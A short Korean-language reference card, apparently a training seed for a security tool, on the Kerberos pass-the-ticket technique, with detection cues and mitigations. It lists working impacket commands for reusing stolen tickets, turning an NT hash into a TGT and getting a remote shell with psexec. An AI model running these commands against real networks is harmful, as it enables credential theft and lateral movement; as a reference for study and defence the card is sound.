# 학습 시드(심화): pass-the-ticket

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn pass-the-ticket`. P1: 머신별 라이트업 미참조.

## 개요
Pass-the-Ticket(T1550.003): 탈취/위조 Kerberos 티켓으로 인증.

## 핵심 기법 · 열거
- ccache/kirbi 티켓 재사용
- Overpass-the-Hash(해시→TGT)

## 표준 도구 · 명령
```
export KRB5CCNAME=<ticket>.ccache; klist
impacket-getTGT <domain>/user -hashes :<nthash>   # OPtH
impacket-psexec -k -no-pass <host>
```

## 블루팀 탐지
비정상 티켓 재사용·호스트 불일치 티켓·4769 이상.

## 완화
티켓 수명 단축·보호된 사용자·tgt 재발급 제한·LSASS 보호.

- 출처(검증): https://attack.mitre.org/techniques/T1550/003/
